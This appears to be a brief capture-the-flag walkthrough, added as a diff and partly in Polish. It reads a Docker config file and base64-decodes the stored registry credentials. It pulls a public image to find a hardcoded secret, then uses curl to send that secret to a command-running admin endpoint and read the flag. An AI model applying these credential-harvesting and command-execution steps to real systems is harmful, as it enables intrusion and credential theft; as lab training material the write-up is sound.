@@ -1,0 +1,26 @@
+elektrycerz:~$ cat todo.txt 
+localhost:8080/run/<command>
+Zabezpieczyłem panel administracyjny sekretnym kodem. To już chyba wszystko, czy o czymś jeszcze zapomniałem?
+
+elektrycerz:~$ cat .docker/config.json 
+{
+        "auths": {
+                "https://index.docker.io/v1/": {
+                        "auth": "ZWxla3RyeWNlcnoxMTEyMjI6PzV5W2dCZWw8fFgvazdkZnQ0MjdBZg=="
+                }
+        }
+}
+
+> echo 'ZWxla3RyeWNlcnoxMTEyMjI6PzV5W2dCZWw8fFgvazdkZnQ0MjdBZg==' | base64 -d
+elektrycerz111222:?5y[gBel<|X/k7dft427Af%                                                                                                             ~ ❯❯❯ 
+
+Password is wrong, but the user exist and he has a public repo:
+
+Open https://hub.docker.com/r/elektrycerz111222/paneltest
+
+> docker pull elektrycerz111222/panel
+
+Run it and examine content. You will find the source with hardcoded secret code.
+
+For the flag run this request the challenge machine:
+elektrycerz:~$ curl -X POST -F "secret=deezah1aid3ieph9oagut2iefoonie1uluoqueip" "http://localhost:8080/run/cat%20flag.txt"
